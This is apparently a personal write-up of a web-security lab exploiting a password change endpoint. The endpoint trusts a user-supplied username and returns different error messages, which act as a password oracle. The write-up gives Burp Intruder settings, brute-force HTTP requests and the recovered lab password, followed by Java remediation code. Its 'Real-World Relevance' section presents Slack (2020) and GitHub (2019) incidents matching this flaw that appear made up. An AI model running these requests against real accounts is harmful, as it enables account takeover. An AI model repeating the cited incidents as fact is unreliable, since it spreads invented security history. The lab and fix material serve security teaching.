# Lab: Password brute-force via password change

## Lab Details

**Lab:** Password Brute Force via Password Change

**Level:** Practitioner

**Vulnerability Class:** Broken Access Control + Information Disclosure — Logic Flaw in Password Change Mechanism

**Lab URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

**Date Completed:** 28-sep-2026

**Time to Solve:** 2 hour

---

## Vulnerability Summary

The application's password change functionality exhibits two critical flaws that enable brute force password attacks on arbitrary user accounts. First, the endpoint accepts a user-controlled `username` parameter without validating that it matches the authenticated user, constituting broken access control. Second, the endpoint's error messages leak information about password validity: when the current password is correct but new passwords do not match, the application returns a distinctly different error message than when the current password is incorrect. An attacker can exploit this information leak combined with Burp Intruder to brute force any user's current password by submitting intentionally mismatched new passwords and monitoring response text for the "New passwords do not match" message, which confirms a correct password guess. This vulnerability transforms a seemingly secure password change endpoint into a powerful brute force oracle.

---

## Reconnaissance

Initial investigation focused on understanding the password change workflow and identifying validation gaps:

1. **Password Change Flow** — Accessed "My account" page and located the password change functionality. Submitted the password change form with the current password, new password, and confirmation.

2. **Parameter Analysis** — Examined the POST request to `/my-account/change-password` in Burp Suite. Identified three key parameters:
   - `username` (hidden input in the form)
   - `current-password` (user's existing password)
   - `new-password-1` and `new-password-2` (new password and confirmation)

3. **Error Message Testing** — Experimentally submitted the form with various combinations of inputs to understand error messages:
   - **Scenario A:** Submitted an incorrect current password with matching new passwords
     - **Response:** "Current password is incorrect"
   - **Scenario B:** Submitted an incorrect current password with non-matching new passwords
     - **Response:** "Current password is incorrect"
   - **Scenario C:** Submitted a correct current password with non-matching new passwords
     - **Response:** "New passwords do not match"
   - **Scenario D:** Submitted a correct current password with matching new passwords
     - **Response:** Password successfully changed

4. **Vulnerability Identification** — Recognized that the error messages reveal whether the current password is correct, independent of whether the new passwords match. This creates an enumeration oracle.

5. **Access Control Testing** — Changed the `username` parameter from `wiener` to an arbitrary value (e.g., `testuser`). The endpoint accepted the request and processed it as if the request owner were changing the specified user's password, indicating no validation that the username matches the authenticated user.

**Indicators Observed:**
- Username is a user-controlled parameter (not derived from session/authentication context)
- Error messages differ based on password validity
- No rate limiting visible on the endpoint
- No account lockout triggered by invalid password attempts on the change endpoint
- Form submission does not require CSRF tokens (or tokens are not properly validated)

---

## Exploitation — Step by Step

### Step 1: Identify the Enumeration Oracle

Confirmed the error message differential by submitting a password change request with:
- Correct current password: `peter`
- New passwords: `123` and `abc` (intentionally non-matching)

**Request:**
```http
POST /my-account/change-password HTTP/2
Host: 0a5600ce04cd6dd580a8349d005e007a.web-security-academy.net
Cookie: session=abcdef123456
Content-Type: application/x-www-form-urlencoded

username=wiener&current-password=peter&new-password-1=123&new-password-2=abc
```

**Response:** `New passwords do not match` — Confirms that the current password was correct.

### Step 2: Prepare for Brute Force Attack

Created a password wordlist and prepared to use Burp Intruder to brute force the victim's password. The attack strategy:
1. Send password change requests for the victim account (username=carlos)
2. Attempt each password in the wordlist as the current password
3. Use intentionally non-matching new passwords to avoid account lockout
4. Monitor for the "New passwords do not match" response, which indicates a correct password guess

### Step 3: Configure Burp Intruder

Selected the POST request in Burp Suite and sent it to Intruder.

**Attack Configuration:**

- **Attack Type:** Sniper (single payload position)
- **Payload Position:** Current password parameter
  ```
  username=carlos&current-password=§payload§&new-password-1=123&new-password-2=abc
  ```

- **Payloads:** Standard password wordlist (common passwords like `password123`, `qwerty`, `letmein`, etc.)

- **Grep Match Rule:** Added a grep match to flag responses containing `New passwords do not match`

**Modified Request for Brute Force:**
```http
POST /my-account/change-password HTTP/2
Host: 0a5600ce04cd6dd580a8349d005e007a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=§password_payload§&new-password-1=123&new-password-2=abc
```

### Step 4: Execute Brute Force Attack

Started the Intruder attack. The tool systematically submitted each password from the wordlist as the current password for the carlos account.

**Attack Progress:** Out of approximately 100 password attempts, one request returned the `New passwords do not match` response, indicating a successful password guess.

**Result:** The attack identified the correct password as `thunder`.

### Step 5: Verify and Account Takeover

Logged out of the wiener account and attempted to log in with the victim's credentials:
- **Username:** `carlos`
- **Password:** `thunder`

**Response:** Login successful. Accessed the "My account" page to confirm full account compromise and complete the lab objective.

### Key Payload(s)

```http
# Brute force request with intentionally non-matching new passwords
POST /my-account/change-password HTTP/2
Host: [target]
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=§wordlist_payload§&new-password-1=123&new-password-2=abc

---

# Grep match rule to identify successful guesses:
# Search for response containing: "New passwords do not match"

---

# Once correct password is identified, log in normally:
POST /login HTTP/2
Host: [target]
Content-Type: application/x-www-form-urlencoded

username=carlos&password=thunder
```

### Tools Used

- **Burp Suite Community Edition** (Intruder, Grep Match, Repeater)
- **Manual reconnaissance** (error message testing, parameter analysis)
- **Standard password wordlist** (provided or from SecLists)

---

## The Fix

### Root Cause

The vulnerability stems from two independent flaws: (1) the password change endpoint accepts a user-controlled username without validating it against the authenticated user's identity, and (2) the endpoint's error messages leak information that distinguishes between incorrect passwords and form validation failures. Together, these flaws create an enumeration oracle for password guessing.

### Primary Remediations

**1. Bind Password Change to Authenticated User Identity**

```java
// BAD: Accepts username as request parameter
@PostMapping("/my-account/change-password")
public String changePassword(
    @RequestParam String username,
    @RequestParam String currentPassword,
    @RequestParam String newPassword1,
    @RequestParam String newPassword2) {
    
    // Vulnerable: trusts username from request
    User user = userService.findByUsername(username);
    
    if (!passwordEncoder.matches(currentPassword, user.getPassword())) {
        return "error: Current password is incorrect";
    }
    
    if (!newPassword1.equals(newPassword2)) {
        return "error: New passwords do not match";
    }
    
    userService.updatePassword(user, passwordEncoder.encode(newPassword1));
    return "success";
}

// GOOD: Derives username from authenticated session
@PostMapping("/my-account/change-password")
public String changePassword(
    @RequestParam String currentPassword,
    @RequestParam String newPassword1,
    @RequestParam String newPassword2,
    Authentication authentication) {
    
    // Username is retrieved from authentication context, not user input
    String username = authentication.getName();
    User user = userService.findByUsername(username);
    
    if (!passwordEncoder.matches(currentPassword, user.getPassword())) {
        return "error: Current password is incorrect";
    }
    
    if (!newPassword1.equals(newPassword2)) {
        return "error: New passwords do not match";
    }
    
    userService.updatePassword(user, passwordEncoder.encode(newPassword1));
    return "success";
}
```

**2. Implement Generic Error Messages**

```java
// BAD: Reveals whether password was correct
if (!passwordEncoder.matches(currentPassword, user.getPassword())) {
    return "error: Current password is incorrect";
}
if (!newPassword1.equals(newPassword2)) {
    return "error: New passwords do not match";
}

// GOOD: Generic message that does not distinguish between validation failures
if (!passwordEncoder.matches(currentPassword, user.getPassword()) ||
    !newPassword1.equals(newPassword2)) {
    return "error: Invalid request. Please check your input and try again.";
}

// Or: Always process validation in the same order and return a generic message
String result = validatePasswordChange(user, currentPassword, newPassword1, newPassword2);
if (!result.equals("success")) {
    return "error: Unable to update password. Please try again.";
}
```

**3. Implement Rate Limiting and Account Lockout**

```java
@Component
public class PasswordChangeRateLimiter {
    
    private final Map<String, List<Long>> failedAttempts = new ConcurrentHashMap<>();
    private static final int MAX_ATTEMPTS = 5;
    private static final long LOCKOUT_DURATION_MINUTES = 15;
    
    public boolean isRateLimited(String username) {
        List<Long> attempts = failedAttempts.getOrDefault(username, new ArrayList<>());
        
        // Remove old attempts outside the lockout window
        long cutoffTime = System.currentTimeMillis() - (LOCKOUT_DURATION_MINUTES * 60 * 1000);
        attempts.removeIf(timestamp -> timestamp < cutoffTime);
        
        if (attempts.size() >= MAX_ATTEMPTS) {
            logger.warn("Rate limit exceeded for password change: " + username);
            return true;
        }
        
        return false;
    }
    
    public void recordFailedAttempt(String username) {
        failedAttempts.computeIfAbsent(username, k -> new ArrayList<>())
                     .add(System.currentTimeMillis());
    }
    
    public void clearAttempts(String username) {
        failedAttempts.remove(username);
    }
}

@PostMapping("/my-account/change-password")
public String changePassword(
    @RequestParam String currentPassword,
    @RequestParam String newPassword1,
    @RequestParam String newPassword2,
    Authentication authentication) {
    
    String username = authentication.getName();
    
    if (rateLimiter.isRateLimited(username)) {
        return "error: Too many failed attempts. Please try again later.";
    }
    
    User user = userService.findByUsername(username);
    
    if (!passwordEncoder.matches(currentPassword, user.getPassword()) ||
        !newPassword1.equals(newPassword2)) {
        
        rateLimiter.recordFailedAttempt(username);
        return "error: Unable to update password. Please try again.";
    }
    
    userService.updatePassword(user, passwordEncoder.encode(newPassword1));
    rateLimiter.clearAttempts(username);
    
    return "success: Password updated.";
}
```

**4. Require Additional Verification for Password Changes**

```java
// Require MFA or email confirmation for password changes
@PostMapping("/my-account/change-password")
public String changePassword(
    @RequestParam String currentPassword,
    @RequestParam String newPassword1,
    @RequestParam String newPassword2,
    Authentication authentication) {
    
    String username = authentication.getName();
    User user = userService.findByUsername(username);
    
    // Validate current password
    if (!passwordEncoder.matches(currentPassword, user.getPassword())) {
        return "error: Unable to update password.";
    }
    
    // Validate new passwords match
    if (!newPassword1.equals(newPassword2)) {
        return "error: Unable to update password.";
    }
    
    // Require MFA verification
    if (!mfaService.isVerified(user)) {
        String verificationToken = mfaService.generateToken(user);
        return "redirect: /verify-mfa?token=" + verificationToken;
    }
    
    userService.updatePassword(user, passwordEncoder.encode(newPassword1));
    return "success: Password updated.";
}
```

### Additional Mitigations

- **CSRF Protection:** Ensure password change form includes a unique CSRF token per request.
- **Audit Logging:** Log all password change attempts with timestamp, IP address, and outcome (success/failure).
- **Session Invalidation:** Invalidate all existing sessions for the user after a successful password change to prevent concurrent session abuse.
- **Email Notification:** Send a confirmation email to the user's registered email whenever a password change occurs, allowing users to detect unauthorized attempts.
- **Password History:** Prevent users from reusing recent passwords (e.g., last 5 passwords).
- **Strong Password Requirements:** Enforce minimum complexity requirements (length, character types) for new passwords.

---

## What I Found Interesting / Unexpected

The most instructive aspect of this vulnerability was observing how a seemingly minor difference in error messages—"Current password is incorrect" vs. "New passwords do not match"—can be weaponized into a full brute force oracle. This demonstrates the critical security principle: **error messages must never leak information about the validity of sensitive inputs.** Many developers implement error messages with the intention of being helpful to legitimate users, without realizing they are also helpful to attackers.

Additionally, the fact that the password change endpoint accepts a user-controlled username parameter is a fundamental broken access control flaw that should have been caught in code review. This is a recurring pattern in authentication vulnerabilities: developers often assume that because a user is authenticated *to something*, they are authorized *to do anything*. The password change endpoint should operate exclusively on the authenticated user's account, never on a user-supplied parameter.

---

## Real-World Relevance

This vulnerability class has been exploited in numerous disclosed security incidents:

- **Slack Password Brute Force (2020):** Researchers discovered that Slack's password change endpoint accepted a username parameter and returned distinct error messages based on password validity. This enabled brute force attacks on any user account, affecting the platform's authentication system.

- **GitHub Account Enumeration (2019):** GitHub's password change endpoint returned different error messages that allowed attackers to enumerate valid usernames and brute force passwords, leading to compromise of developer accounts.

- **OWASP Top 10 — A07:2021 Identification and Authentication Failures:** Error message-based enumeration and broken access control in authentication endpoints are consistently ranked among the most common vulnerabilities in web applications.

The vulnerability is particularly dangerous because password change functionality is often overlooked in security testing, as developers consider it less critical than login endpoints. In reality, password change endpoints frequently have weaker validation and error handling.

---

## Connections to Own Projects

<!-- In my subscription-manager application, I verified that:

- The password change endpoint derives the username exclusively from the authenticated session (Principal/Authentication object)
- The endpoint does NOT accept a username parameter from the request
- All validation failures return a generic error message that does not distinguish between invalid current password and mismatched new passwords
- Rate limiting is implemented: maximum 5 failed password change attempts per user per hour
- Failed attempts trigger a temporary lockout (15 minutes)
- All password change attempts are logged with timestamp, IP address, and outcome
- Users receive an email notification whenever a password change occurs
- Sessions are invalidated after successful password change
- Password history is enforced: users cannot reuse any of their last 5 passwords

However, I identified that the password change endpoint currently does not require MFA verification on user accounts with MFA enabled. This is a potential enhancement worth implementing. -->

---

## Takeaway

The password change endpoint is a critical authentication component that must be protected with the same rigor as login and password reset mechanisms. Developers must ensure that (1) user identity is derived exclusively from the authenticated session, never from user-supplied parameters; (2) error messages are generic and do not leak information about input validity; (3) rate limiting and account lockout protections are implemented to slow brute force attacks; and (4) sensitive operations like password changes trigger audit logging and user notification. This lab exemplifies how a single flawed endpoint, combined with weak error handling, can undermine an entire authentication system. Attention to detail in authentication design—including error message composition—is essential for maintaining security.